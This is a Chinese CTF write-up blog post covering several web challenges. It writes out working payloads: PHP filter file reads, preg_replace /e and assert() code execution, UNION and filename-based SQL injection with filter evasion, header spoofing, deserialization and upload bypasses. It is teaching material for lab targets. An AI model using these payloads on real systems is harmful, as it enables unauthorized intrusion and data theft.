name="zbcZl"></a></p><h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>查看源码发现?page&#x3D;index，出现page这个get参数，联想到可能存在文件包含读源码的漏洞<br />尝试读取index.php的页面源码，通过php内置协议直接读取代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p><a name="8ljxr"></a></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>base64解密之后，审计源码，分析得到如下关键部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a name="iFio8"></a></p><h3 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。</span><br><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组。</span><br></pre></td></tr></table></figure><p>preg_replace函数存在命令执行漏洞<br />此处明显考察的是preg_replace 函数使用 <code>/e</code>模式，导致代码执行的问题。</p><blockquote><p>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p></blockquote><p>也就是说，pat和sub有相同部分，rep的代码就会执行。<br />根据源码分析X-Forwarded-For改成127.0.0.1之后，GET进三个参数。然后调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入”&#x2F;e”触发漏洞<br><a name="X6BCi"></a></p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>看到这样的代码我们可以这样构造payload:<br />在HTTP头添加：<br />X-Forwarded-For:127.0.0.1<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls’)&amp;sub&#x3D;a<br />从而爆出文件列<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名’)&amp;sub&#x3D;a<br />从而爆出该文件下的文件名<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名&#x2F;文件名’)&amp;sub&#x3D;a<br><a name="jI6kn"></a></p><h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a><br />ics-06</h2><p>根据提示进入报表中心，发现url中id&#x3D;1,尝试爆破，发现当id&#x3D;2333时会有flag</p><p><a name="UWZNk"></a></p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p>大名鼎鼎的彩票题，代码审计PHP弱类型，true和1的返回结果一样，所以直接构造：<br />{“action”:”buy”,”numbers”: [true,true,true,true,true,true,true]}</p><p><a name="T1fDV"></a></p><h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>不是xss就是sql，但是想到这是一道CTF题，xss的几率不大，所以直接尝试，<br />爆库(xxxx，爆表(xxx，爆列(xx，爆值(x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,1,database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=&#x27; xxx&#x27; #</span><br><span class="line">1&#x27; union select 1,1,xx from xxxx.xxx # </span><br><span class="line">or </span><br><span class="line">1&#x27;union select 1,1,group_concat(xx) from xxx #</span><br></pre></td></tr></table></figure><p><a name="IrRZj"></a></p><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>代码注射题：<br />先用GitHack 将源码down下来<strong>assert()函数容易引起代码注射：</strong><br />eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>涉及函数:</strong></p><ul><li>strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</li></ul><p>语法：strpos(string,find,start)<br />参数 描述<br />string 必需。规定要搜索的字符串。<br />find 必需。规定要查找的字符串。<br />start 可选。规定在何处开始搜索。</p><ul><li>file_exists() 函数检查文件或目录是否存在</li></ul><p>如果指定的文件或目录存在则返回 true，否则返回 false。<br /><br><br />根据上述特性可以对assert第一次出现的位置进行构造：<br /><strong>通过可控变量file传入恶意参数，构造闭合 strpos(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line">qwe<span class="string">&#x27;,&#x27;</span>abc<span class="string">&#x27;)===false and system(&#x27;</span>cat templates/flag.php<span class="string">&#x27;) and strops(&#x27;</span>qwe</span><br><span class="line">结果：</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;qwe&#x27;,&#x27;abc&#x27;)===false and system(&#x27;cat templates/flag.php&#x27;) and strops(&#x27;qwe&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们也可以对第二处进行构造:<br /><strong>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;) or phpinfo();#</span></span><br></pre></td></tr></table></figure><blockquote><p>关于此处的#:   #是单行注释，由assert(“phpinfo()”)  &lt;&#x3D;&#x3D;&gt;  <?phpinfo()?>   可知，#的作用域仅仅是assert(函数内)<br>即为注释掉 ‘)<br>利用：<br />1’) or print_r(file_get_contents(‘templates&#x2F;flag.php’));#</p></blockquote><p><a name="SSJyY"></a></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>[<a href="http://tool.chinaz.com/robots/">百度一下robots</a>]:</p><blockquote><p>Robots.txt 是存放在站点根目录下的一个纯文本文件。虽然它的设置很简单，但是作用却很强大。它可以指定搜索引擎蜘蛛只抓取指定的内容，或者是禁止搜索引擎蜘蛛抓取网站的部分或全部内容。<br><strong>使用方法:</strong><br>Robots.txt 文件应该放在网站根目录下，并且该文件是可以通过互联网进行访问的。<br>例如：如果您的网站地址是 <a href="http://www.yourdomain.com/%E9%82%A3%E4%B9%88%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E5%BF%85%E9%A1%BB%E8%83%BD%E5%A4%9F%E9%80%9A%E8%BF%87">http://www.yourdomain.com/那么，该文件必须能够通过</a> <a href="http://www.yourdomain.com/robots.txt">http://www.yourdomain.com/robots.txt</a> 打开并看到里面的内容。<br><strong>格式：</strong><br>User-agent:<br>用于描述搜索引擎蜘蛛的名字，在” Robots.txt “文件中，如果有多条User-agent记录说明有多个搜索引擎蜘蛛会受到该协议的限制，对该文件来说，至少要有一条User-agent记录。如果该项的值设为<em>，则该协议对任何搜索引擎蜘蛛均有效，在” Robots.txt “文件中，”User-agent:</em>“这样的记录只能有一条。<br>Disallow:<br>用于描述不希望被访问到的一个URL，这个URL可以是一条完整的路径，也可以是部分的，任何以Disallow开头的URL均不会被Robot访问到。</p></blockquote><p>所以直接访问，再继续访问flag页面即可</p><p><a name="GnJCL"></a></p><h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">_=<span class="string">&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123; [0]);.splice(0,1)&#125;&#125;&#125; \&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot; write(s[o%4]buttonif(e.ment&#x27;</span>;<span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">&#x27; &#x27;</span>)<span class="title function_">with</span>(_.<span class="title function_">split</span>($[Y]))_=<span class="title function_">join</span>(<span class="title function_">pop</span>());<span class="built_in">eval</span>(_)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加上HTML后缀点开发现乱码，解决办法：将eval改为alert，输出源码“</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line"> if(e.match(/^be0f23/)!=null)</span><br><span class="line">  if(e.match(/233ac/)!=null)</span><br><span class="line">   if(e.match(/e98aa$/)!=null)</span><br><span class="line">    if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">     var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">     var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">     var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">     var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">     var s=[t,n,r,i];</span><br><span class="line">     for(var o=0;o&lt;13;++o)</span><br><span class="line">      &#123;</span><br><span class="line">       document.write(s[o%4][0]);</span><br><span class="line">       s[o%4].splice(0,1)</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">    delete _</span><br></pre></td></tr></table></figure><p>解法1：构造payload输进文本框,payload需要满足1.16位 2.be0f23开头 e98aa结尾的 be0f233acc7be98aa<br />解法2：将含有输出flag的代码放到控制台即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">    var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">    var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">    var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">    var s=[t,n,r,i];</span><br><span class="line">    for(var o=0;o&lt;13;++o)</span><br><span class="line">     &#123;</span><br><span class="line">      document.write(s[o%4][0]);</span><br><span class="line">      s[o%4].splice(0,1)</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p><a name="aKu4b"></a></p><h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>根据标题，我们能看出来这是一道PHP反序列化题，仔细斟酌，我们需要将它进行序列化，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。</p><blockquote><p><br />serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。<br>可以在__sleep()方法里可以决定哪些属性被序列化<br>如果没有__sleep()方法则默认序列化所有属性</p></blockquote><p>eg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">序列化函数serialize()</span><br><span class="line">序列化举例说明：</span><br><span class="line">O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">3 代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line">3 代表三个属性</span><br><span class="line">s代表字符串</span><br><span class="line">4代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure><p>本题序列化出来：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}<br />则如果要绕过__wakeup，则只需改变对象属性的个数即可绕过，则把O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;} 中的1改为大于它的数即可</p><p><a name="rUdpT"></a></p><h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p><a name="a1V1V"></a></p><h3 id="大坑1：二次注入"><a href="#大坑1：二次注入" class="headerlink" title="大坑1：二次注入"></a>大坑1：二次注入</h3><p>进去之后尝试二次注入。即注册用户admin ‘# 完事儿后进去修改密码，修改完的就是admin的密码，结果发现用admin登录之后没用<br><a name="gTR8B"></a></p><h3 id="大坑2：爆破"><a href="#大坑2：爆破" class="headerlink" title="大坑2：爆破"></a>大坑2：爆破</h3><p>尝试爆破的小伙伴就不用费心了<br><a name="wkO77"></a></p><h3 id="大坑3：忘记密码"><a href="#大坑3：忘记密码" class="headerlink" title="大坑3：忘记密码"></a>大坑3：忘记密码</h3><p>在各种办法都试过之后，我终于看到忘记密码这个选项了，别的办法的都试过了，没用，那就只能从这下手了，尝试修改密码，用admin的账户修改，发现报错，没用，差点死心了，不得已而为之，我只好尝试修改自己注册的二次注入用户admin ‘#，用它修改密码然后抓包，修改它，即用户名为admin，发现修改成功！<br><a name="tsClf"></a></p><h3 id="大坑4：IP伪造"><a href="#大坑4：IP伪造" class="headerlink" title="大坑4：IP伪造"></a>大坑4：IP伪造</h3><p>进去之后，不多BB直接点manage，发现IP不被允许，只好再次抓包，在Referer头下面添加X-forwarded-for:127.0.0.1，伪造成功！<br><a name="PQ4X8"></a></p><h3 id="大坑5：do-？"><a href="#大坑5：do-？" class="headerlink" title="大坑5：do??？"></a>大坑5：do??？</h3><p>进去之后啥也没，只好查看页面元素发现提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?module=filemanage&amp;<span class="keyword">do</span>=???</span><br></pre></td></tr></table></figure><p>do???这时候就得猜了，无非就是文件上传,upload,尝试之后，终于进去了：<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576407995541-4530fc54-635b-4e00-8797-383a0eb31c73.png" alt="2.png"><br><a name="l3Ijo"></a></p><h3 id="大坑6：一句话写法"><a href="#大坑6：一句话写法" class="headerlink" title="大坑6：一句话写法"></a>大坑6：一句话写法</h3><p>发现写入一句话<?php eval(中间我就省略不写了)?>，显示上传失败：it’s a php,尝试写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(.....懒得打)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><a name="OrGSf"></a></p><h3 id="大坑7：后缀名"><a href="#大坑7：后缀名" class="headerlink" title="大坑7：后缀名"></a>大坑7：后缀名</h3><p>发现不让上传PHP文件，更改后缀为js或html，虽然成功了但是没爆出flag，也归为失败<br />几番尝试之后，发现后缀改为php5即可</p><p><a name="aAx8r"></a></p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>这道题虽说是一道文件上传题，确实是，但是套路用的却是sql注入的，我怎么想也想不到，fuzz几遍后迫于无奈看了一下wp,才发现这是sql注入并且注入点在filename,ohmygod,我太难了。。。</p><p><a name="Vg0Qp"></a></p><h3 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h3><p>用了一下以往的注入思路，union select 1,1,1#<br />发现不仅没点卵用，而且还过滤了union和select<br><a name="yx4fl"></a></p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>web_up)</span><br></pre></td></tr></table></figure><p>尝试以后发现用这个数据库暴不出来表<br />然后修改一下substr的起始位置参数，看看后边还有没有<br />修改为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),13,20),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>load)</span><br></pre></td></tr></table></figure><p>数据库名合起来为:web_upload</p><p><a name="pcMN4"></a></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">hello_</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">flag_i</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">s_here</span><br></pre></td></tr></table></figure><p>表名连起来就是：hello_flag_is_here<br><a name="e0rnw"></a></p><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">i_am_f</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">lag</span><br></pre></td></tr></table></figure><p>列名就出来了：i_am_flag，其实后面不用爆就能猜到是lag<br><a name="xONsw"></a></p><h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"><span class="operator">!</span><span class="operator">!</span>_<span class="variable">@m_</span></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">Th.e_F</span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"><span class="operator">!</span>lag</span><br></pre></td></tr></table></figure><p>flag的值我们就有了:!!&lt;<a href="mailto:&#x5f;&#x40;&#x6d;&#x5f;&#84;&#x68;&#x2e;&#101;&#95;&#70;">&#x5f;&#x40;&#x6d;&#x5f;&#84;&#x68;&#x2e;&#101;&#95;&#70;</a>&gt;!lag</p><p><a name="TqsUH"></a></p><h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><p>首先很多人一定有疑问，这个注入语句两端的+加号和单引号是干嘛的?<br />加上＋的意思是把页面传进来的值放在SQL语句里拼接起来<br /><strong>记住这样的传值格式<br /></strong>“numbers”: [true,true,true,true,true,true,true]} &#x2F;&#x2F;定义数组<br />“numbers”:”1,2,3,4,5,6,7”}<br />‘+(xxxxxx)+’</p><p><strong>函数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>CONV()</span><br><span class="line">        简单的来说这个函数就是用来进行进制的转换的</span><br><span class="line">        </span><br><span class="line">        CONV(N,from_base,to_base)</span><br><span class="line">        </span><br><span class="line">        N是要转换的数据，from_base是原进制，to_base是目标进制。</span><br><span class="line">        </span><br><span class="line">        如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数</span><br><span class="line">        </span><br><span class="line"> <span class="number">2.</span>substr（）</span><br><span class="line">    简单来说 这个函数是用来搜索字符串的</span><br><span class="line">        </span><br><span class="line">    substr(string string,num <span class="keyword">start</span>,num length);</span><br><span class="line"></span><br><span class="line">    string为字符串；</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">start</span>为起始位置；</span><br><span class="line">    </span><br><span class="line">    length为长度。</span><br><span class="line">    </span><br><span class="line">    mysql中的<span class="keyword">start</span>是从<span class="number">1</span>开始的，而hibernate中的<span class="keyword">start</span>是从<span class="number">0</span>开始的。</span><br><span class="line">        </span><br><span class="line">        注意，这里substr取<span class="number">12</span>位是因为一旦过长（超出<span class="number">12</span>），就会用科学记数法显示</span><br><span class="line"></span><br><span class="line"> <span class="number">3.</span>hex（）</span><br><span class="line">    这个就很好理解了，转为<span class="number">16</span>进制嘛</span><br><span class="line">        </span><br><span class="line">  <span class="number">4.</span>limit</span><br><span class="line">     LIMIT 子句可以被用于强制 <span class="keyword">SELECT</span> 语句返回指定的记录数。</span><br><span class="line"></span><br><span class="line">    LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。</span><br><span class="line"></span><br><span class="line">    如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</span><br><span class="line"></span><br><span class="line">    初始记录行的偏移量是 <span class="number">0</span>(而不是 <span class="number">1</span>)：</span><br><span class="line">        </span><br><span 